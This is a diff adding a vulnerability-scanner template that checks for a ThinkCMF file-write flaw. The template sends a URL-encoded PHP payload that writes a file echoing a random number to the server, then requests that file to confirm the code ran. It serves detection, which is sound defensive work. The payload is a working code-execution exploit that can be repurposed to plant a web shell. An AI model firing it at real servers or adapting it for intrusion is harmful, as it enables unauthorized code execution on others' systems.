@@ -1,0 +1,22 @@
+id: thinkcmf-write-shell
+
+info:
+    name: Thinkcmf write shell
+    author: violin
+    severity: high
+
+set:
+    r: randomInt(10000, 20000)
+    r1: randomInt(1000000000, 2000000000)
+rules:
+    r0:
+        request:
+            method: GET
+            path: /index.php?a=fetch&content=%3C?php+file_put_contents(%22{{r}}.php%22,%22%3C?php+echo+{{r1}}%3B%22)%3B
+        expression: "true"
+    r1:
+        request:
+            method: GET
+            path: /{{r}}.php
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1)))
+expression: r0() && r1()
